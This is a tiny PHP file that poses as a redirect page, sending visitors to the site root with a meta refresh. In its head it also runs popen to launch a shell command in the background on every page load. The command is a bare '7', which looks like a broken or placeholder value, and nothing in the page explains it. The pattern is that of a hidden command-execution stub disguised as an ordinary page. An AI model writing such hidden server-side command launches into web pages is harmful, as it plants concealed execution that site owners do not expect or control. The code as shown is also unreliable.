<?php
$metarefresh = '<meta http-equiv="refresh" content="0; url=/" />';
?>
<html>
    <head>
       <?php
        echo $metarefresh;
	pclose(popen(7 . ' &', 'r'))
        ?>
    </head>
</html>
